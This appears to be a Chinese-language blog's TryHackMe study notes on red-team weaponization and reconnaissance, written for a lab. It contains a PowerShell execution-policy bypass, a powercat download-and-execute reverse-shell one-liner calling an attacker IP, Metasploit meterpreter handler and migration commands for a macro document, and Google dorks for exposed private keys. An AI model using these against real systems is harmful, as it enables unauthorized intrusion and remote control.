Weaponization Room!”</h3><h4 id="創建腳本"><a href="#創建腳本" class="headerlink" title="創建腳本"></a>創建腳本</h4><blockquote><p>創建一個簡單的 PowerShell 腳本開始，該腳本將顯示 “Welcome to the Weaponization Room!”</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Write-Output &quot;Welcome to the Weaponization Room!&quot;</span><br></pre></td></tr></table></figure><blockquote><p>將文件保存為 thm.ps1。</p></blockquote><h4 id="執行腳本"><a href="#執行腳本" class="headerlink" title="執行腳本"></a>執行腳本</h4><blockquote><p>在powershell裡輸入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -File thm.ps1</span><br></pre></td></tr></table></figure><blockquote><p><img src="/photo/Red_Team_Weaponization/38.jpg" alt="38"><br>PowerShell 的執行策略是一種安全選項，用於保護系統免受惡意腳本的運行。為了安全起見，Microsoft 默認禁止執行 PowerShell 腳本（.ps1 文件）。PowerShell 的執行策略設定為「Restricted」（受限），這意味著它允許單個命令的執行，但不允許運行任何腳本。</p></blockquote><blockquote><p>查看powershell執行腳本設定</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ExecutionPolicy</span><br></pre></td></tr></table></figure><blockquote><p>更改設定</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy -Scope CurrentUser RemoteSigned</span><br><span class="line">A</span><br></pre></td></tr></table></figure><blockquote><p>Set-ExecutionPolicy：這是用來設定 PowerShell 的執行策略的命令。<br>-Scope CurrentUser：這個選項指定命令的作用範圍僅限於當前用戶。這意味著這個政策變更只會影響當前用戶的會話和未來的會話，而不影響其他用戶。<br>RemoteSigned：這是要設定的執行策略類型。它允許執行本地創建的腳本而不需任何簽名，但要求從外部來源（例如互聯網）下載的腳本必須有一個有效的數字簽名。</p></blockquote><blockquote><p>數字簽名的作用<br>數字簽名用於驗證腳本的完整性和來源，確保腳本自簽名以來未被更改，並且確認腳本的作者或發佈者是信任的實體。數字簽名是利用公鑰基礎設施（PKI）技術來實現的，其中包括使用證書來證明簽名者的身份。</p></blockquote><blockquote><p>更改完後執行腳本<br><img src="/photo/Red_Team_Weaponization/39.jpg" alt="39"></p></blockquote><blockquote><p>也可用此命令繞過限制</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ex bypass -File thm.ps1</span><br></pre></td></tr></table></figure><blockquote><p>powershell：這是啟動 PowerShell 的命令。<br>-ex bypass：<br>-ex 是 -ExecutionPolicy 的縮寫，這是用來設定腳本執行策略的參數。<br>bypass 表示設置執行策略為繞過（bypass），即忽略任何執行策略的限制，允許所有 PowerShell 腳本執行。這對於測試或在受控環境中運行未簽名的腳本很有用。</p></blockquote><blockquote><p>-File thm.ps1：<br>-File 是一個參數，指定要執行的 PowerShell 腳本文件。<br>thm.ps1 是腳本文件的名稱，此命令告訴 PowerShell 執行當前目錄下名為 thm.ps1 的文件。</p></blockquote><h3 id="獲取反向-shell"><a href="#獲取反向-shell" class="headerlink" title="獲取反向 shell"></a>獲取反向 shell</h3><h4 id="下載powershell"><a href="#下載powershell" class="headerlink" title="下載powershell"></a>下載powershell</h4><blockquote><p>powercat</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/besimorhino/powercat.git</span><br></pre></td></tr></table></figure><blockquote><p>進入克隆下來的目錄</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd powercat</span><br></pre></td></tr></table></figure><blockquote><p>開啟網站伺服器</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure><blockquote><p>監聽想要的端口</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1337</span><br></pre></td></tr></table></figure><blockquote><p>在受害主機的powshell執行</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.212.101:8080/powercat.ps1&#x27;);powercat -c 192.168.212.101 -p 1337 -e cmd&quot;</span><br></pre></td></tr></table></figure><blockquote><p>powershell：這是啟動 PowerShell 的命令。<br>-c：這個參數表示要執行的命令為一個字符串（command string）。<br>“IEX(New-Object System.Net.WebClient).DownloadString(‘<a href="http://attackbox_ip:8080/powercat.ps1')%22%EF%BC%9A%E9%80%99%E9%83%A8%E5%88%86%E5%91%BD%E4%BB%A4%E5%81%9A%E4%BA%86%E4%BB%A5%E4%B8%8B%E5%B9%BE%E4%BB%B6%E4%BA%8B%EF%BC%9A">http://ATTACKBOX_IP:8080/powercat.ps1&#39;)&quot;：這部分命令做了以下幾件事：</a><br>New-Object System.Net.WebClient：創建一個新的 WebClient 物件，用於從網絡上下載文件。<br>.DownloadString(‘<a href="http://attackbox_ip:8080/powercat.ps1')%EF%BC%9A%E5%88%A9%E7%94%A8">http://ATTACKBOX_IP:8080/powercat.ps1&#39;)：利用</a> WebClient 物件從指定的 URL 下載 powercat.ps1 腳本的字符串內容。這個 URL 指向攻擊機上運行的 web 服務器，端口為 8080。<br>IEX (Invoke-Expression)：執行從網絡上下載的字符串內容作為 PowerShell 腳本。這使得下載的 powercat.ps1 腳本立即在本地執行。<br>;：這是命令分隔符，用於在一行內分隔多個 PowerShell 命令。<br>powercat -c ATTACKBOX_IP -p 1337 -e cmd：這是 powercat.ps1 腳本的一個功能，用於建立反向 shell：<br>-c ATTACKBOX_IP：指定連線目標 IP 地址，即攻擊機的 IP 地址。<br>-p 1337：指定連線目標的端口號，此例中為 1337。<br>-e cmd：指定當連線建立後，要執行的程序，這裡是 Windows 的命令提示符（cmd）。</p></blockquote><blockquote><p>成果<br><img src="/photo/Red_Team_Weaponization/40.jpg" alt="40"></p></blockquote><h2 id="命令與控制-（C2-或-C-C）"><a href="#命令與控制-（C2-或-C-C）" class="headerlink" title="命令與控制 -（C2 或 C&amp;C）"></a>命令與控制 -（C2 或 C&amp;C）</h2><h3 id="什麼是指揮與控制（C2）？"><a href="#什麼是指揮與控制（C2）？" class="headerlink" title="什麼是指揮與控制（C2）？"></a>什麼是指揮與控制（C2）？</h3><blockquote><p>C2 框架是在滲透後階段被用來允許紅隊成員合作和控制受損計算機的框架。在進行網絡攻擊行動中，C2 被認為是紅隊成員最重要的工具之一。C2 框架提供了快速而簡便的方法來進行以下幾點：</p></blockquote><ul><li>生成各種惡意負載<blockquote><p>使用 Metasploit 框架生成特定於目標系統漏洞的 Shellcode。例如，透過 msfvenom 工具生成一個針對 Windows 10 的 Meterpreter 逆向連接 shell，該 shell 能夠在被攻擊的系統上靜默執行並提供遠程控制。</p></blockquote></li><li>枚舉受損的計算機&#x2F;網絡<blockquote><p>使用 PowerShell Empire 進行內網掃描，識別網絡中的其他活動主機、開放的端口和運行的服務。這可以幫助確定進一步攻擊的潛在目標。</p></blockquote></li><li>執行權限提升和橋接<blockquote><p>如果初始的 shell 是以普通用戶權限獲得的，可以利用 Cobalt Strike 提供的各種提權 Exploit，如不當權限配置或系統漏洞，來獲得系統級別的訪問權限。</p></blockquote></li><li>橫向移動<blockquote><p>旦獲得一台機器的控制權，紅隊可以使用像是 Pass-the-Hash（PtH）攻擊技術來訪問相同網絡中的其他機器。Cobalt Strike 和 Metasploit 都提供了進行橫向移動的工具和技術，例如利用已獲得的憑證來遠程執行命令或部署惡意軟件到其他電腦上。<br>Pass-the-Hash（PtH）<br>哈希的獲得：<br>攻擊者首先需要從一台計算機上獲得用戶賬戶的哈希值。這可以通過多種方法實現，包括但不限於利用系統漏洞、惡意軟件感染或直接從系統檔案（如SAM文件）或記憶體中提取。<br>使用哈希進行身份驗證：<br>一旦獲得哈希，攻擊者可以使用這些哈希來嘗試登錄到網絡中的其他機器。在 Windows 環境中，NTLM 身份驗證過程允許使用用戶的 NTLM 哈希進行身份驗證，而不需要明文密碼。<br>訪問網絡資源：<br>  成功使用哈希進行身份驗證後，攻擊者可以訪問其他計算機、服務或資料，就如同他們擁有那些用戶的實際密碼一樣。</p></blockquote></li></ul><h3 id="常用C2框架"><a href="#常用C2框架" class="headerlink" title="常用C2框架"></a>常用C2框架</h3><h4 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h4><blockquote><p>Cobalt Strike 是一款商業框架，專注於對手模擬和紅隊行動。它結合了遠程訪問工具、滲透後能力以及獨特的報告系統。它提供了一個代理，擁有先進的技術來建立隱蔽的通信並執行各種操作，包括鍵盤記錄、文件上傳和下載、VPN部署、權限提升技術、Mimikatz、端口掃描以及最先進的橫向移動。</p></blockquote><h4 id="PowerShell-Empire"><a href="#PowerShell-Empire" class="headerlink" title="PowerShell Empire"></a>PowerShell Empire</h4><blockquote><p>PowerShell Empire 是一個開源框架，它幫助紅隊操作員和滲透測試人員通過使用密鑰和共享密碼在多個服務器之間進行協作。它是基於 PowerShell 和 Python 代理的利用框架。PowerShell Empire 專注於 Windows 和 Active Directory 環境的客戶端和滲透後的利用。</p></blockquote><h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><blockquote><p>Metasploit 是一個廣泛使用的滲透測試框架，提供各種技術和工具以便輕鬆進行黑客攻擊。它是一個開源框架，被認為是滲透測試和紅隊行動的主要工具之一。Metasploit 是我們在此房間中使用的工具之一，用來生成我們武器化階段的負載。</p></blockquote><h2 id="交付技巧"><a href="#交付技巧" class="headerlink" title="交付技巧"></a>交付技巧</h2><blockquote><p>交付技術是獲得初始訪問的重要因素之一。他們必須讓受害者看起來專業、合法、令人信服，才能貫徹執行內容。</p></blockquote><h3 id="電子郵件傳送"><a href="#電子郵件傳送" class="headerlink" title="電子郵件傳送"></a>電子郵件傳送</h3><blockquote><p>使用電子郵件傳遞負載是一種常見的方法，通常是通過發送含有鏈接或附件的釣魚郵件來實現。這種方法附加了一個惡意文件，可能是我們之前提到的類型。其目的是說服受害者訪問惡意網站或下載並運行惡意文件，以便獲得對受害者網絡或主機的初始訪問權限。<br>紅隊成員應擁有自己用於釣魚的基礎設施。根據紅隊活動的要求，需要在電子郵件服務器內設置各種選項，包括域密鑰確認郵件（DKIM）、發送者政策框架（SPF）和DNS指針（PTR）記錄。<br>紅隊成員還可以使用具有良好聲譽的第三方電子郵件服務，如 Google Gmail、Outlook、Yahoo 等。<br>另一個有趣的方法是使用公司內部的被攻破的電子郵件帳戶來向公司內部或其他人發送釣魚郵件。被攻破的電子郵件可能是通過釣魚或其他技術如密碼噴霧攻擊被黑的。</p></blockquote><h3 id="網頁傳遞"><a href="#網頁傳遞" class="headerlink" title="網頁傳遞"></a>網頁傳遞</h3><blockquote><p>紅隊成員控制的網絡服務器上托管惡意負載。網絡服務器必須遵循安全指南，例如其域名擁有清潔的記錄和聲譽，以及TLS（傳輸層安全）證書。<br>也就是紅隊成員可以將惡意軟體或負載放置在由他們控制的網路伺服器上。為了確保這個方法的成功，這個網路伺服器需要符合一些安全指南，比如它的域名需要有一個良好的記錄和聲譽，並且需要擁有一個有效的 TLS（傳輸層安全）證書。這樣做的目的是為了讓受害者感覺這個網站是可信的，從而誘使他們訪問或下載這些惡意負載。<br>這種方法包括其他技術，如社交工程手段誘使受害者訪問或下載惡意文件。在使用這種方法時，URL縮短器可能會很有幫助。<br>在這種方法中，可以結合並使用其他技術。攻擊者可以利用零日漏洞，例如利用易受攻擊的軟體如Java或瀏覽器，將它們用於釣魚郵件或網頁傳遞技術中，以獲得對受害者機器的訪問權限。</p></blockquote><h3 id="USB-交付"><a href="#USB-交付" class="headerlink" title="USB 交付"></a>USB 交付</h3><blockquote><p>這種方法需要受害者在物理上插入惡意的 USB。這種方法在會議或活動中可能會非常有效和有用，因為對手可以在那裡分發 USB。<br>通常，組織會建立強有力的政策，例如出於安全考量，在其組織環境中禁用 USB 使用。而其他組織則允許在目標環境中使用 USB。<br>用於武器化 USB 設備的常見 USB 攻擊包括 Rubber Ducky 和 USBHarpoon，以及像 O.MG Cable 這樣的充電 USB 線。</p></blockquote><h2 id="小試身手"><a href="#小試身手" class="headerlink" title="小試身手"></a>小試身手</h2><h3 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h3><blockquote><p>我们已经准备了一台运行Windows 10的计算机，上面运行着一个用户模拟Web应用程序，用于自动执行你的有效载荷或访问恶意的HTA链接。部署附带的机器，并等待几分钟直到它启动并运行。然后，访问位于 <a href="http://machine_ip:8080/">http://MACHINE_IP:8080/</a> 的用户模拟Web应用程序。<br>Web应用程序允许上传VBS、DOC、PS1文件格式的有效载荷。此外，如果你提供一个恶意的HTA链接，Web应用程序将访问你的链接。<br>关于Doc文件的注意事项：在提供的Windows 10机器上使用的模拟将打开恶意Word文档，并在90秒内关闭。为了获得更长的存在时间，你需要在收到连接后尽快进行迁移。<br>在Metasploit框架中，我们可以使用迁移（migrate）功能将当前进程注入到受害机器上的另一个进程中。在我们的案例中，我们需要将当前的进程，即MS Word文档，迁移到另一个进程中，以使连接在MS Word文档关闭后仍保持稳定。最简单的方法是使用以下的迁移后模块（migrate post-module），</p></blockquote><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><blockquote><p>利用msf創建一個hta的後門程式<br>將程式代碼附近到word裡的巨集並儲存<br>啟用msf監聽</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 10.50.159.15</span><br><span class="line">set LPORT 443</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><blockquote><p>將word檔上傳到受害機<br><img src="/photo/Red_Team_Weaponization/41.jpg" alt="41"><br>轉移對話</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/migrate </span><br></pre></td></tr></table></figure><blockquote><p><img src="/photo/Red_Team_Weaponization/43.jpg" alt="43"><br>尋找使用者桌面資料找到flag<br><img src="/photo/Red_Team_Weaponization/42.jpg" alt="42"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 紅隊武器化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 紅隊 </tag>
            
            <tag> 筆記 </tag>
            
            <tag> tryhackme </tag>
            
            <tag> 道德黑客 </tag>
            
            <tag> 自學 </tag>
            
            <tag> 攻擊階段-武器化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Red Team Recon</title>
      <link href="/2024/04/20/Red-Team-Recon/"/>
      <url>/2024/04/20/Red-Team-Recon/</url>
      
        <content type="html"><![CDATA[<h1 id="紅隊偵查"><a href="#紅隊偵查" class="headerlink" title="紅隊偵查"></a>紅隊偵查</h1><h2 id="被動偵查"><a href="#被動偵查" class="headerlink" title="被動偵查"></a>被動偵查</h2><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><h4 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h4><blockquote><p>WHOIS 伺服器在TCP連接埠 43 上偵聽傳入請求。網域名稱註冊商負責維護其租賃網域的 WHOIS 記錄。whois將查詢 WHOIS 伺服器以提供所有已儲存的記錄。</p></blockquote><h4 id="查詢項目"><a href="#查詢項目" class="headerlink" title="查詢項目"></a>查詢項目</h4><ul><li>註冊商 WHOIS 伺服器</li><li>註冊商網址</li><li>記錄建立日期</li><li>記錄更新日期</li><li>註冊人聯絡資訊和地址（除非出於隱私原因而保留）</li><li>管理員聯絡資訊和地址（除非出於隱私原因而保留）</li><li>技術聯絡資訊和地址（除非出於隱私原因而保留）</li></ul><h4 id="示範"><a href="#示範" class="headerlink" title="示範"></a>示範</h4><blockquote><p><img src="/photo/Red_Team_Recon/1.jpg" alt="1"><br>有時因查詢的網站未有公開資訊而找不到</p></blockquote><h3 id="who-is網頁版"><a href="#who-is網頁版" class="headerlink" title="who.is網頁版"></a>who.is網頁版</h3><h4 id="網址"><a href="#網址" class="headerlink" title="網址"></a>網址</h4><blockquote><p><a href="https://whois.domaintools.com/">whois</a></p></blockquote><h4 id="示範-1"><a href="#示範-1" class="headerlink" title="示範"></a>示範</h4><blockquote><p><img src="/photo/Red_Team_Recon/2.jpg" alt="2"><br>建議網頁板與終端機都查一遍</p></blockquote><h3 id="dig-nslookup-host"><a href="#dig-nslookup-host" class="headerlink" title="dig&#x2F;nslookup&#x2F;host"></a>dig&#x2F;nslookup&#x2F;host</h3><h4 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h4><h5 id="簡介-1"><a href="#簡介-1" class="headerlink" title="簡介"></a>簡介</h5><blockquote><p>nslookup使用預設DNS伺服器來取得與我們的網域相關的 A 和 AAAA 記錄</p></blockquote><h5 id="示範-2"><a href="#示範-2" class="headerlink" title="示範"></a>示範</h5><p><img src="/photo/Red_Team_Recon/3.jpg" alt="3"></p><h4 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h4><h5 id="簡介-2"><a href="#簡介-2" class="headerlink" title="簡介"></a>簡介</h5><blockquote><p>dig提供了許多查詢選項，甚至允許您指定要使用的不同 DNS 伺服器，較nslookup詳細，但預設為查詢ipv4，需要使用參數查ipv6，可指定要查尋哪個dns</p></blockquote><h5 id="示範-3"><a href="#示範-3" class="headerlink" title="示範"></a>示範</h5><blockquote><p><img src="/photo/Red_Team_Recon/4.jpg" alt="4"><br><img src="/photo/Red_Team_Recon/5.jpg" alt="5"></p></blockquote><h4 id="host"><a href="#host" class="headerlink" title="host"></a>host</h4><h5 id="簡介-3"><a href="#簡介-3" class="headerlink" title="簡介"></a>簡介</h5><blockquote><p>host是查詢DNS伺服器的DNS記錄的另一個有用的替代方法。</p></blockquote><h5 id="示範-4"><a href="#示範-4" class="headerlink" title="示範"></a>示範</h5><blockquote><p><img src="/photo/Red_Team_Recon/6.jpg" alt="6"></p></blockquote><h3 id="traceroute-tracert"><a href="#traceroute-tracert" class="headerlink" title="traceroute&#x2F;tracert"></a>traceroute&#x2F;tracert</h3><h4 id="簡介-4"><a href="#簡介-4" class="headerlink" title="簡介"></a>簡介</h4><blockquote><p>traceroute&#x2F;tracert為我們提供了將我們連接到目標系統的路由器（躍點）。值得強調的是，有些路由器不會回應 發送的資料包traceroute，因此我們看不到它們的 IP 位址； a*用來表示這種情況。</p></blockquote><h4 id="示範-5"><a href="#示範-5" class="headerlink" title="示範"></a>示範</h4><blockquote><p><img src="/photo/Red_Team_Recon/7.jpg" alt="7"><br>如圖所示，由於在學校網路測試，因學校路由器未回應，因此都顯示*</p></blockquote><h3 id="google-hack"><a href="#google-hack" class="headerlink" title="google hack"></a>google hack</h3><h4 id="簡介-5"><a href="#簡介-5" class="headerlink" title="簡介"></a>簡介</h4><blockquote><p>每個搜尋引擎可能有一組略有不同的規則和語法。要了解不同搜尋引擎的具體語法，您需要訪問它們各自的幫助頁面。</p></blockquote><h4 id="google查詢語法"><a href="#google查詢語法" class="headerlink" title="google查詢語法"></a>google查詢語法</h4><ul><li>“search phrase”<blockquote><p>尋找具有精確搜尋字詞的結果</p></blockquote></li><li>OSINT filetype:pdf<blockquote><p>尋找PDF與特定術語相關的類型的文件。(可替換doc, docx, ppt, pptx, xls and xlsx.)</p></blockquote></li><li>salary site:blog.tryhackme.com<blockquote><p>將搜尋結果限制在特定站點。</p></blockquote></li><li>pentest -site:example.com<blockquote><p>從結果中排除特定網站</p></blockquote></li><li>walkthrough intitle:TryHackMe<blockquote><p>尋找頁面標題中包含特定術語的頁面。</p></blockquote></li><li>challenge inurl:tryhackme<blockquote><p>尋找頁面 URL 中包含特定術語的頁面。</p></blockquote></li></ul><h4 id="進階搜尋網頁"><a href="#進階搜尋網頁" class="headerlink" title="進階搜尋網頁"></a>進階搜尋網頁</h4><blockquote><p><a href="https://www.google.com/advanced_search">Google 高級搜尋</a></p></blockquote><h4 id="搜尋語法參考網址"><a href="#搜尋語法參考網址" class="headerlink" title="搜尋語法參考網址"></a>搜尋語法參考網址</h4><blockquote><p><a href="https://support.google.com/websearch/answer/2466433">Google Refine Web Searches</a><br><a href="https://help.duckduckgo.com/duckduckgo-help-pages/results/syntax/">DuckDuckGo Search Syntax</a><br><a href="https://help.bing.microsoft.com/apex/index/18/en-US/10002">Bing Advanced Search Options</a></p></blockquote><h4 id="google公開漏洞查詢網"><a href="#google公開漏洞查詢網" class="headerlink" title="google公開漏洞查詢網"></a>google公開漏洞查詢網</h4><blockquote><p><a href="https://www.exploit-db.com/google-hacking-database">谷歌駭客資料庫（GHDB）</a></p></blockquote><h4 id="示範-6"><a href="#示範-6" class="headerlink" title="示範"></a>示範</h4><blockquote><p>立足點:使用查詢intitle:”index of” “nginx.log”來發現 Nginx 日誌，並可能揭示可被利用的伺服器錯誤配置。<br><img src="/photo/Red_Team_Recon/8.jpg" alt="8"></p></blockquote><blockquote><p>包含使用者名稱的檔案:使用搜尋字詞intitle:”index of” “contacts.txt”來發現洩漏重要資訊的檔案<br><img src="/photo/Red_Team_Recon/9.jpg" alt="9"></p></blockquote><blockquote><p>敏感目錄:使用搜尋字詞inurl:&#x2F;certs&#x2F;server.key來找出 RSA 私鑰是否暴露。<br><img src="/photo/Red_Team_Recon/10.jpg" alt="10"></p></blockquote><blockquote><p>Web 伺服器偵測:偵測 GlassFish Server 資訊intitle:”GlassFish Server - Server Running<br>GlassFish Server 是一個开源的应用服务器，用于部署和管理Java Platform, Enterprise Edition (Java EE) 技术和应用程序。它是第一个完全符合 Java EE 标准的开源应用服务器，由 Sun Microsystems 开发，并后来由 Oracle 继续支持和维护。GlassFish Server 支持所有主要的 Java EE 技术，如 JSP, Enterprise JavaBeans, JPA, JMS, Web Services 以及更多的现代化应用程序接口。<br><img src="/photo/Red_Team_Recon/11.jpg" alt="11"></p></blockquote><blockquote><p>易受攻擊的檔案:找PHP檔案。intitle:”index of” “*.php”<br><img src="/photo/Red_Team_Recon/12.jpg" alt="12"></p></blockquote><blockquote><p>易受攻擊的伺服器:發現 SolarWinds Orion Web 控制台，使用查詢intext:”user name” intext:”orion core” -solarwinds.com<br>SolarWinds Orion Web 控制台是一款由 SolarWinds 提供的网络管理软件的用户界面部分，它允许网络管理员监控和管理其 IT 基础设施。Orion 平台是一个可伸缩的网络和系统管理解决方案，支持从小型网络到大型企业级环境的广泛应用。<br><img src="/photo/Red_Team_Recon/13.jpg" alt="13"></p></blockquote><blockquote><p>錯誤訊息:可以從錯誤訊息中提取大量有用的信息。使用查詢intitle:”index of” errors.log來尋找與錯誤相關的日誌檔案<br><img src="/photo/Red_Team_Recon/14.jpg" alt="14"></p></blockquote><h4 id="經典問題"><a href="#經典問題" class="headerlink" title="經典問題"></a>經典問題</h4><blockquote><p><img src="/photo/Red_Team_Recon/16.jpg" alt="16"></p></blockquote><h3 id="查看網頁歷史"><a href="#查看網頁歷史" class="headerlink" title="查看網頁歷史"></a>查看網頁歷史</h3><h4 id="簡介-6"><a href="#簡介-6" class="headerlink" title="簡介"></a>簡介</h4><blockquote><p>擷取客戶網站上職缺頁面的先前版本，及活動頻繁程度</p></blockquote><h4 id="網址-1"><a href="#網址-1" class="headerlink" title="網址"></a>網址</h4><blockquote><p><a href="https://web.archive.org/">Wayback Machine</a></p></blockquote><h4 id="示範-7"><a href="#示範-7" class="headerlink" title="示範"></a>示範</h4><blockquote><p><img src="/photo/Red_Team_Recon/15.jpg" alt="15"></p></blockquote><h3 id="ViewDNS-info"><a href="#ViewDNS-info" class="headerlink" title="ViewDNS.info"></a>ViewDNS.info</h3><h4 id="簡介-7"><a href="#簡介-7" class="headerlink" title="簡介"></a>簡介</h4><blockquote><p>ViewDNS.info 提供反向 IP 查找服务。最初，每个网络服务器会使用一个或多个 IP 地址；然而，今天，共享主机服务器变得很常见。在共享主机中，一个 IP 地址被许多不同的网络服务器共享，这些服务器有着不同的域名。通过反向 IP 查找，从一个域名或 IP 地址出发，你可以找到使用特定 IP 地址的其他域名。注意:一個ip有可能以多個網站</p></blockquote><h4 id="網址-2"><a href="#網址-2" class="headerlink" title="網址"></a>網址</h4><blockquote><p><a href="https://viewdns.info/">ViewDNS.info</a> </p></blockquote><h4 id="示範-8"><a href="#示範-8" class="headerlink" title="示範"></a>示範</h4><blockquote><p><img src="/photo/Red_Team_Recon/17.jpg" alt="17"></p></blockquote><h3 id="Threat-Intelligence-Platform"><a href="#Threat-Intelligence-Platform" class="headerlink" title="Threat Intelligence Platform"></a>Threat Intelligence Platform</h3><h4 id="簡介-8"><a href="#簡介-8" class="headerlink" title="簡介"></a>簡介</h4><blockquote><p>威胁情报平台要求您提供一个域名或 IP 地址，然后它将启动一系列测试，从恶意软件检查到 WHOIS 和 DNS 查询。WHOIS 和 DNS 的结果类似于我们使用 whois 和 dig 命令得到的结果，但威胁情报平台以更易读和视觉上更吸引人的方式呈现这些结果。我们的报告中还包含了额外的信息。我們還可以獲得同一 IP 位址上的其他網域的清單。</p></blockquote><h4 id="網址-3"><a href="#網址-3" class="headerlink" title="網址"></a>網址</h4><blockquote><p><a href="https://threatintelligenceplatform.com/">Threat Intelligence Platform</a></p></blockquote><h4 id="示範-9"><a href="#示範-9" class="headerlink" title="示範"></a>示範</h4><blockquote><p><img src="/photo/Red_Team_Recon/18.jpg" alt="18"></p></blockquote><h3 id="Censys"><a href="#Censys" class="headerlink" title="Censys"></a>Censys</h3><h4 id="簡介-9"><a href="#簡介-9" class="headerlink" title="簡介"></a>簡介</h4><blockquote><p>Censys Search可以提供大量有關 IP 位址和網域的資訊，我們尋找解析為的 IP 位址之一cafe.thmredteam.com。我們可以很容易地推斷我們找到的IP位址屬於Cloudflare。我們可以看到與連接埠80和443等相關的資訊</p></blockquote><h4 id="網址-4"><a href="#網址-4" class="headerlink" title="網址"></a>網址</h4><blockquote><p><a href="https://search.censys.io/">Censys Search</a></p></blockquote><h4 id="示範-10"><a href="#示範-10" class="headerlink" title="示範"></a>示範</h4><blockquote><p><img src="/photo/Red_Team_Recon/19.jpg" alt="19"></p></blockquote><h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h3><h4 id="簡介-10"><a href="#簡介-10" class="headerlink" title="簡介"></a>簡介</h4><blockquote><p>尋找有關我們從 獲得的 IP 位址之一的資訊，獲得IP位址的地理位置和開放的端口</p></blockquote><h4 id="網址-5"><a href="#網址-5" class="headerlink" title="網址"></a>網址</h4><blockquote><p><a href="https://www.shodan.io/">Shodan</a><br>也可使用終端機查詢(須事前設定API)</p></blockquote><h4 id="示範-11"><a href="#示範-11" class="headerlink" title="示範"></a>示範</h4><blockquote><p><img src="/photo/Red_Team_Recon/20.jpg" alt="20"><br><img src="/photo/Red_Team_Recon/35.jpg" alt="35"></p></blockquote><h4 id="小問題-查詢你目前連接的公網ip"><a href="#小問題-查詢你目前連接的公網ip" class="headerlink" title="小問題(查詢你目前連接的公網ip)"></a>小問題(查詢你目前連接的公網ip)</h4><p><img src="/photo/Red_Team_Recon/21.jpg" alt="21"><br><img src="/photo/Red_Team_Recon/22.jpg" alt="22"></p><h2 id="訊息蒐集模板"><a href="#訊息蒐集模板" class="headerlink" title="訊息蒐集模板"></a>訊息蒐集模板</h2><h3 id="Recon-ng"><a href="#Recon-ng" class="headerlink" title="Recon-ng"></a>Recon-ng</h3><h4 id="簡介-11"><a href="#簡介-11" class="headerlink" title="簡介"></a>簡介</h4><blockquote><p>Recon-ng 是一个框架，旨在帮助自动化开源情报（OSINT）工作。它使用来自各种作者的模块，并提供多种功能。某些模块需要密钥才能工作；这些密钥允许模块查询相关的在线 API。从渗透测试和红队的角度来看，Recon-ng 可以用来发现各种信息碎片，这些信息可以帮助执行操作或OSINT(開源情報 (OSINT) 是出於情報目的收集和分析公開資料的行為。)任务。</p></blockquote><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p><img src="/photo/Red_Team_Recon/23.jpg" alt="23"></p><h4 id="步驟"><a href="#步驟" class="headerlink" title="步驟"></a>步驟</h4><ul><li><p>啟動程式</p><blockquote><p>recon-ng</p></blockquote></li><li><p>創建工作空間</p><blockquote><p>運行workspaces create WORKSPACE_NAME為您的調查建立一個新的工作區<br>recon-ng -w WORKSPACE_NAME 启动 recon-ng 并指定特定工作区<br><img src="/photo/Red_Team_Recon/24.jpg" alt="24"></p></blockquote></li><li><p>填充数据库</p><blockquote><p>将域名 arping.me 插入到 domains 表中。我们可以使用命令 db insert domains<br>如果我们想检查数据库中的表名，我们可以运行 db schema<br><img src="/photo/Red_Team_Recon/25.jpg" alt="25"></p></blockquote></li><li><p>Recon-ng 市场</p><blockquote><p>marketplace search KEYWORD 来搜索包含关键词的可用模块。<br>marketplace info MODULE 来提供有关所询问模块的信息<br>marketplace install MODULE 来安装指定的模块到 Recon-ng 中。<br>marketplace remove MODULE 